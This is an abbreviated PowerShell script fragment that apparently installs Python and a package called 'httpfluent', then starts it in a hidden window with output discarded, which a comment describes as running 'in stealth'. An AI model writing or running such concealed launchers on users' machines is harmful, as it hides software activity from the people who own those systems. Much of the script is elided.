# ===================================================
# Python 3.12.6 + httpfluent (Direct PowerShell Exec)
...
if ($InstallRequired) {
    ...
    # Refresh current session path so the 'httpfluent' command is known
    $env:Path = $NewPath
...
# --- THE FIX: EXECUTE USING POWERSHELL COMMAND ---
# We use Start-Process to run the command 'httpfluent' directly in stealth.
# No -m flag used.
Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command httpfluent" -WindowStyle Hidden > $null 2>&1
